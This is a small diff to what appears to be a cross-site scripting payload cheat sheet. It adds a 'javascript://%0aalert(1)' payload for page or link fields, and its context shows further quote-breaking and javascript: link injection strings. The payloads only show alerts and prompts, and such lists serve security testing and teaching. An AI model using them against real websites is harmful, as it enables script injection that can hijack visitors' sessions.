@@ -20,6 +20,11 @@ XSS with %0d
 "><a href="javascript:alert(0)">click here</a>
 ```
 
+**Creat Page(게시판,링크,)**
+```
+javascript://%0aalert(1)
+```
+
 ```
 "-prompt(8)-"
 '-prompt(8)-'
